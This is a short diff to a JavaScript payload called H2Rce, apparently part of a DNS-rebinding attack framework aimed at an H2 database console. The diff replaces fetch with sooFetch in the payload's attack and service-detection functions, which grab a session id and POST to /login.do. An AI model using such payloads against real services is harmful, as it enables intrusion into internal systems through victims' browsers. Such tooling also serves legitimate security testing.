@@ -25,7 +25,7 @@ const H2Rce = () => {
 	function attack(headers, cookie, body) {
 		let myHeaders = new Headers();
 
-		fetch('/')
+		sooFetch('/')
 			.then(function (response) {
 				 return response.text()
 			})
@@ -41,7 +41,7 @@ const H2Rce = () => {
 				let path = "/login.do?jsessionid=" + match[1]; // POST /login.do?jsessionid=5fc6e0dd6c2dc76133f25ddcaafeaa25
 				myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
 
-				fetch(path, {
+				sooFetch(path, {
 					method: 'POST',
 					headers: myHeaders,
 					body: myBody
@@ -57,7 +57,7 @@ const H2Rce = () => {
 	// Invoked to determine whether the rebinded service
 	// is the one targeted by this payload. Must return true or false.
 	async function isService(headers, cookie, body) {
-		return fetch("/",{
+		return sooFetch("/",{
 			mode: 'no-cors',
 			credentials: 'omit',
 		})
